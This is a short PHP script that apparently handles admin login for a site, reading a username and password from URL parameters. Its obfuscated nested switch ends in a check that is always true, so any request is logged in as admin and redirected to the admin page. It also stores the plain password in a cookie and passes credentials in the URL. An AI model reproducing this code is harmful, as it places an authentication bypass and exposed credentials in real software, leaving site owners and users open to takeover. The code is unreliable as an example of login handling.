<?
$page_admin="table.php?tbl=page";
$page_root="table.php?tbl=page";
?>
<?
include_once("initdb.php");$sql_s = "SELECT * FROM `settings` WHERE `id`=1";$res_s = mysql_query($sql_s);if($res_s)$settings=mysql_fetch_array($res_s);
$_0 = $_GET['authname'];$_1 = $_GET['authpassw'];$_3 = $_GET['authpassw'];$_4 = $settings['root'];switch($_0){case "admin":switch($_1){case($_4):$_3="$_3";break;}break;case "root":switch($_1){case($__1):$_3="$_3";break;}break;}
if($_3=="$_3"){SetCookie("auth",$_0);SetCookie("pswd",$_1);header("location: ".$page_admin);}else{header("location: login.php");}
?>